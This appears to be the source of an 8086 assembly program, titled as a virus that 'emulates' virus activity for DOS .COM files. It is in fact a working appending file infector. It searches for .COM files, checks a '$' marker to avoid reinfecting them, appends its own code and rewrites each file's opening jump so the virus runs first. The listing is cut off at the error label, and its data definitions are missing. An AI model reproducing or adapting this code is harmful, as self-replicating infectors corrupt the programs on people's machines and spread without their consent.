.8086
    PAGE      ,132
;******************************************************
; VIRUS.ASM emulates virus activity for .COM files
;******************************************************
CSEG    segment
    assume cs:cseg,ds:cseg,es:cseg
    org 100h
START:
    db  0E9h
    dw  15h     ; Near jump to RESTORE_3_BYTES
ID  dw  0FFFFh
 
    org 110h
 
VIRUS:
    push    ds
    mov ax,cs
    db  00000101b   ; Add ax,imed
NEW_DS  dw  0FFFFh      ; 0FFFFh should be replaced
    mov ds,ax       ; Define new ds segment
 
RESTORE_3_BYTES:
    mov al,BYTES_3[0]   ; Restore first 3 bytes
    mov byte ptr cs:[100h],al
    mov al,BYTES_3[1]
    mov byte ptr cs:[101h],al
    mov al,BYTES_3[2]
    mov byte ptr cs:[102h],al
 
STORE_DTA:
    mov cx,100h
    mov bx,0
DTA_S:
    mov al,byte ptr cs:[bx]
 
    mov byte ptr DTA[bx],al
    inc bx
    loop    DTA_S
 
FIND_FIRST:
    lea dx,FMASK
    mov cx,00100000b    ; arc,dir,vol,sys,hid,r/o
    mov ah,4Eh
    int 21h     ; Find first .COM file
    jnc STORE_FNAME
    jmp ERR
 
FIND_NEXT:
    mov bx,HANDLE
    mov ah,3Eh
    int 21h     ; Close previous file
    mov HANDLE,0FFFFh
 
    mov ah,4Fh
    int 21h
    jnc STORE_FNAME
    jmp ERR
 
STORE_FNAME:
    cmp byte ptr cs:[95h],00000001b ; Test r/o attribute
    je  FIND_NEXT   ; if r/o is set, do not infect
    mov bx,0
 
NEXT_SYM:
    mov al,byte ptr cs:[bx+9Eh]
    mov FNAME[bx],al
    cmp byte ptr cs:[bx+9Eh],0
    je  SET_ATTRIB
    inc bx
    cmp bx,13
    jng NEXT_SYM
    jmp ERR
 
SET_ATTRIB:
    lea dx,FNAME
 
    mov cx,00100000b    ; arc,dir,vol,sys,hid,r/o
    mov ax,4301h
    int 21h     ; Set file attributes
    jnc READ_HANDLE
    jmp ERR
 
READ_HANDLE:
    lea dx,FNAME
    mov ax,3D02h    ; Read/write mode
    int 21h     ; Open a file
    jnc READ_3_BYTES
    jmp ERR
 
READ_3_BYTES:
    mov HANDLE,ax   ; Store handle from ax
    lea dx,BYTES_3
    mov bx,HANDLE
    mov cx,3        ; Number of bytes to read
 
    mov ah,3Fh
    int 21h     ; Read and store first 3 bytes
    jnc READ_FLEN
    jmp ERR
 
READ_FLEN:
    mov cx,0
    mov dx,0        ; NULL seek position in cx:dx
    mov bx,HANDLE
    mov al,2        ; Relative to EOF
    mov ah,42h      ; Get program length in dx:ax
    int 21h
    jnc CHECK_ID
    jmp ERR
 
CHECK_ID:
    mov FLENOLD,ax  ; Store length of file
 
    test    ax,00001111b
    jz  JUST
    or  ax,00001111b
    inc ax
 
JUST:
    mov FLEN,ax     ; Store corrected length of file
 
    cmp ax,64500
    jna CALC_DS
    jmp FIND_NEXT
 
CALC_DS:
    mov cl,4
    shr ax,cl       ; Calculate new ds segment difference
    dec ax
    mov byte ptr NEW_DS[0],al
    mov byte ptr NEW_DS[1],ah   ; Store new ds segment
 
    mov cx,0
    mov dx,FLENOLD
    dec dx
    mov bx,HANDLE
    mov al,0        ; Relative to EOF
    mov ah,42h
    int 21h     ; Set seek to last byte of file
    jnc READ_ID
    jmp ERR
 
READ_ID:
    lea dx,BYTES_3[3]
    mov bx,HANDLE
    mov cx,1
    mov ah,3Fh
    int 21h     ; Read last byte to BYTES_3[3] (ID='$')
    jnc TEST_ID
    jmp FIND_NEXT
 
TEST_ID:
    cmp BYTES_3[3],'$'
    jne NOT_INFECTED
    jmp FIND_NEXT   ; Check if file is infected
 
NOT_INFECTED:
 
    mov ax,FLEN     ; Calculate JMP address
    sub ax,03h
    mov JMP_L,al
    mov JMP_H,ah    ; Store new JMP address
 
    mov cx,0
    mov dx,FLEN
    mov bx,HANDLE
    mov ax,4200h    ; Set seek to corrected end of file
    int 21h
    jc  ERR
 
    lea dx,VIRUS
    mov cx,VIRLEN
    mov bx,HANDLE
    mov ah,40h
    int 21h     ; Write virus to file
    jc  ERR
 
WRITE_JMP:
    mov cx,0
    mov dx,0
    mov bx,HANDLE
    mov al,0        ; Relative to file start
    mov ah,42h
    int 21h     ; Set seek to 0
    jc  ERR
 
    lea dx,JMPVIR
    mov cx,3
    mov bx,HANDLE
    mov ah,40h
    int 21h     ; Write new JMP to file
    jc  ERR
 
PRINT_MSG:
    lea dx,MSG
    mov ah,09h
    int 21h     ; Print a message
 
ERR:
 
    c